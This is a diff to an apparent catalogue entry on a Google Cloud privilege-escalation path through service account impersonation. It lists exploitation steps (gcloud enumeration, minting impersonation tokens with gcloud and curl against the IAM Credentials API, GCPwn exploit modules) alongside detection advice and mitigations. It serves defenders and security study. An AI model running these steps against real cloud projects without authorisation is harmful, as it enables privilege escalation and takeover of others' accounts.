@@ -25,41 +25,54 @@ exploitationSteps:
   gcloud:
   - step: 1
     command: |
-      gcloud iam service-accounts list --format='value(email)'
-    description: Enumerate service accounts in the project to identify potential impersonation targets
+      gcloud iam service-accounts list \
+        --project=PROJECT_ID \
+        --format='value(email)'
+    description: Enumerate service accounts to identify potential impersonation targets. This reconnaissance requires the additional `iam.serviceAccounts.list` permission.
   - step: 2
     command: |
-      gcloud iam service-accounts get-iam-policy TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
-    description: Inspect the IAM policy on a candidate service account to confirm the attacker's principal holds `iam.serviceAccounts.getAccessToken` on it (via a custom role or `roles/iam.serviceAccountTokenCreator`)
+      gcloud iam service-accounts get-iam-policy \
+        TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --project=PROJECT_ID
+    description: Inspect a candidate service account's IAM policy for a custom role or `roles/iam.serviceAccountTokenCreator` binding that grants the attacker `iam.serviceAccounts.getAccessToken`. This reconnaissance requires the additional `iam.serviceAccounts.getIamPolicy` permission.
   - step: 3
-    command: |
-      gcloud projects get-iam-policy PROJECT_ID \
-        --flatten="bindings[].members" \
-        --filter="bindings.members:TARGET_SA@PROJECT_ID.iam.gserviceaccount.com" \
-        --format="table(bindings.role)"
-    description: Confirm the target service account's own project-level role to determine the value of impersonating it
-  - step: 4
     command: |
       gcloud auth print-access-token \
         --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
-    description: Mint a short-lived OAuth access token that authenticates as the target service account
-  - step: 5
+    description: Mint a short-lived OAuth access token that authenticates as the target service account using only the required `iam.serviceAccounts.getAccessToken` permission
+  - step: 4
     command: |
       gcloud PROJECT_RESOURCE_COMMAND \
+        --project=PROJECT_ID \
         --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
-    description: Run any `gcloud` command with `--impersonate-service-account` set to the target account to operate with its inherited project permissions
+    description: Run a Google Cloud command as the target service account to exercise whatever project or resource permissions it holds
+  curl:
+  - step: 1
+    command: |
+      ACCESS_TOKEN=$(gcloud auth print-access-token)
+      TOKEN_RESPONSE=$(curl -sS -X POST \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
+        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken")
+      TARGET_TOKEN=$(echo "$TOKEN_RESPONSE" | jq -r '.accessToken')
+    description: Call the IAM Credentials API directly with `iam.serviceAccounts.getAccessToken` to mint an OAuth token for the target service account
+  - step: 2
+    command: |
+      curl -H "Authorization: Bearer $TARGET_TOKEN" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+    description: Use the minted token directly against Google APIs as the target service account
   gcpwn:
   - step: 1
     command: |
       modules run enum_gcp --iam
-    description: Enumerate IAM bindings across the project (GCPwn's IAM enumeration module surfaces `iam.serviceAccounts.getAccessToken` grants as it maps out privilege escalation edges)
+    description: Enumerate IAM permissions and bindings across the project so GCPwn can identify the `CAN_CREATE_SA_ACCESS_TOKEN` privilege-escalation edge
   - step: 2
     command: |
       modules run exploit_generate_access_token \
-        --target-sa projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
-    description: Use GCPwn's single-permission-movement exploit module to mint a short-lived OAuth 2.0 access token for the target service account and pivot the active session's credentials to it
-limitations: |
-  This path provides administrative access only if the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role at the project level. If the target only has narrowly scoped permissions, the attacker inherits only those, though even limited additional access may enable further multi-hop escalation. Note that `roles/editor` and `roles/viewer` deliberately exclude Secret Manager payload access (`secretmanager.versions.access`), so reaching secrets specifically requires the target to also hold an explicit `roles/secretmanager.secretAccessor` grant.
+        --target-sa projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
+        --project-id PROJECT_ID
+    description: Use Scott Weston and NetSPI's GCPwn single-permission movement module to mint a short-lived OAuth token for the target service account and pivot the active session to it
 recommendation: |
   Service account impersonation is Google's recommended alternative to long-lived service account keys, but granting `iam.serviceAccounts.getAccessToken` across a privilege boundary turns that best practice into a privilege escalation path.
 
@@ -83,6 +96,10 @@ recommendation: |
   - Monitor for `google.iam.admin.v1.SetIAMPolicy` events on service accounts that add new `iam.serviceAccounts.getAccessToken` grants (via `roles/iam.serviceAccountTokenCreator` or a custom role) to service accounts holding elevated project roles.
   - Investigate `GenerateAccessToken` or `SignJwt` events followed within seconds by API calls the caller's own identity does not otherwise have access to.
   - Regularly audit IAM bindings with Policy Analyzer / IAM Recommender to identify service accounts with unused or overly broad impersonation grants.
+limitations: |
+  This path provides administrative access only if the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role at the project level. If the target only has narrowly scoped permissions, the attacker inherits only those, though even limited additional access may enable further multi-hop escalation. Note that `roles/editor` and `roles/viewer` deliberately exclude Secret Manager payload access (`secretmanager.versions.access`), so reaching secrets specifically requires the target to also hold an explicit `roles/secretmanager.secretAccessor` grant.
+
+  The generated OAuth access token is short-lived, but the attacker can mint another token for as long as the impersonation grant remains in place. The token must be used directly with Google APIs or through tooling that supports service account impersonation; it is not a long-lived service account key.
 discoveryAttribution:
   firstDocumented:
     author: Spencer Gietzen
@@ -104,9 +121,10 @@ references:
   url: https://cloud.google.com/iam/docs/create-short-lived-credentials-direct
 - title: 'MITRE ATT&CK T1550.001: Use Alternate Authentication Material - Application Access Token'
   url: https://attack.mitre.org/techniques/T1550/001/
+relatedPaths:
+- sts-001
 detectionTools:
-  prowler: https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/gcp/services/iam/iam_no_service_roles_at_project_level/iam_no_service_roles_at_project_level.py#L19-L22
-  gcp-scanner: https://github.com/google/gcp_scanner/blob/main/src/gcp_scanner/scanner.py#L305-L356
+  gcp-scanner: https://github.com/google/gcp_scanner/blob/9725f0e9867a64d1e2cae889b68d76a0d7e4c8e6/src/gcp_scanner/credsdb.py#L293-L314
   gcpwn: https://github.com/NetSPI/gcpwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/mappings/og_defined_edges.json#L56-L67
 learningEnvironments:
   pathfinding-labs:
